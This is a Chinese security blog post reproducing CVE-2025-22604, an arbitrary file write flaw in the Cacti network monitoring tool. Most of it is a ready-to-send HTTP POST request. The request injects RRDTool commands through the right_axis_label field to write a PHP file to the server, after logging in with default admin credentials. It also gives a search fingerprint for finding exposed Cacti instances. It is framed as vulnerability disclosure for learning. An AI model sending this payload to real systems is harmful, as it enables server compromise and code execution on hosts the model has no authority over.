#  Cacti网络流量监测图形分析工具 任意文件写入漏洞 CVE-2025-22604   
原创 巨黑科  巨黑科   2025-02-17 07:28  
  
系统介绍  
  
  
Cacti是一款基于PHP、MySQL、SNMP及RRDTool构建的网络流量监测图形分析工具。该工具通过SNMP协议中的snmpget命令收集数据，并利用RRDTool生成图形化分析结果，帮助用户直观地了解网络流量情况。  
  
漏洞复现  
  
1、登录Cacti获取token（默认账号密码为admin / admin，首次登录强制修改密码）  
  
2、替换需要写入的文件内容  
```
POST /cacti/graph_templates.php?header=false HTTP/1.1
host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
content-length: 804
Origin: http://192.168.178.78
Connection: keep-alive
Referer: http://{host}/cacti/graph_templates.php?action=template_edit&id=297&csrf_timeout=true&csrf_timeout=true
Cookie: {{Cookie}}
Priority: u=0

__csrf_magic=sid%3A3363ef9d47d62372302b4941b790e92f5f749d9c%2C1735913031&name=PING+-+Advanced+Ping&graph_template_id=297&graph_template_graph_id=297&save_component_template=1&title=%7Chost_description%7C+-+Advanced+Ping&vertical_label=milliseconds&image_format_id=3&height=200&width=700&base_value=1000&slope_mode=on&auto_scale_opts=1&upper_limit=10&lower_limit=0&unit_value=&unit_exponent_value=1&unit_length=&right_axis=&right_axis_label=XXX%0Acreate+my.rrd+--step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+xxx2.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%3C%3F%3Dphpinfo%28%29%3B%3F%3E%0A&right_axis_format=0&right_axis_formatter=0&left_axis_formatter=0&tab_width=30&legend_position=0&legend_direction=0&rrdtool_version=1.7.2&action=save
```  
  
搜索指纹  
  
  
Hunter app.name=="Cacti"  
  
利用条件  
  
Cacti <= 1.2.28  
  
      
![](https://mmbiz.qpic.cn/mmbiz_gif/WxOqWuMeib82iadWaeic5eibXFRz5I49MUvoBZpIbBHuPJdj5YQknyTbq7gAMicfch8xibiascj3QrnjHm47Q1BoRABlg/640?wx_fmt=gif&from=appmsg "")  
  
  
**免责声明**  
  
  
  
本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。  
  
长按下方二维码，关注巨黑科，学习漏洞信息！  
  
  
